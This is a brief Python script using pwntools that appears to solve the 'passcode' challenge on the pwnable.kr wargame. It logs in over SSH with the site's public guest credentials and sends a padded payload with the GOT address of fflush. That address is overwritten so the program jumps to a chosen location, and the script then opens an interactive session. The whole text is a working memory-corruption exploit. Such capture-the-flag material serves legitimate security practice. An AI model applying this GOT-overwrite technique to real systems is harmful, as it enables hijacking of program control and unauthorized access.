from pwn import *

fflush_got_address = 0x804a004
new_got_value = 0x080485e3

sh = ssh('passcode', 'pwnable.kr', password='guest', port=2222)
p = sh.process(['./passcode'])
p.sendline(b'A'*0x60 + p32(fflush_got_address))
p.sendline(str(new_got_value))
p.interactive()